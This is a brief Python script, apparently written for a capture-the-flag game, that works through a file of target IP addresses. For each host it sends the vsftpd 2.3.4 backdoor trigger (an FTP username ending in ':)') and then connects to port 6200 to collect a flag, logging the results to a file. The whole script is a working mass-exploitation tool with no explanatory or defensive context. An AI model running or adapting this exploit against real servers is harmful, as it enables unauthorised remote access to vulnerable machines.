import os
import lib.ftp234 as ftp234
import lib.connect_6200 as connect_6200
    
ip_file = open("ip.txt", "r")
ip_list = []

for i in ip_file:
    ip_list.append(i.rstrip("\n"))

print("RHOST:\n",ip_list)

for i in ip_list:
    ftplogin = ftp234.ftp234()
    ftplogin.connect(host = i, port = 21)
    ftplogin.login(user = "root:)", passwd = "pass")
    ftplogin.close()

    flag = connect_6200.connecting6200_FLAG(RHOST = i)

    flag_file = open("flag.txt", "a+")
    flag_file.write(i+" "+"FLAG = "+flag+"\n")
    flag_file.close()

print("SYSTEM EXIT!!!")